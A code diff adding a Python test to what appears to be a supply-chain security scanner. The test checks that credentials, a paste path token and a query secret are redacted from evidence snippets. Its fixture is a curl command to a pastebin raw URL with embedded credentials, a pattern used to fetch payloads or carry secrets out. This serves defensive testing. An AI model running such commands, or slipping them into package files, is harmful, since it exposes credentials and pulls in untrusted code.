@@ -157,6 +157,21 @@ def test_snippet_redacts_generic_exfil_url_path_tokens():
     assert redacted_gist in evidence["excerpt"]
 
 
+def test_snippet_redacts_url_credentials():
+    evidence = file_evidence(
+        "package.json",
+        artifact_id="a",
+        snippet="curl https://user:password@pastebin.com/raw/abcdef1234567890?token=secret",
+    )
+    assert evidence["excerpt_redacted"] is True
+    assert "user:password" not in evidence["excerpt"]
+    assert "abcdef1234567890" not in evidence["excerpt"]
+    assert "token=secret" not in evidence["excerpt"]
+    assert "https://<redacted>@pastebin.com/raw/<redacted>?<redacted>" in evidence[
+        "excerpt"
+    ]
+
+
 def test_metadata_hashes_secret_like_values():
     evidence = metadata_evidence("npm_token", "super-secret-token-value", artifact_id="a")
     assert evidence["hash"] != "super-secret-token-value"
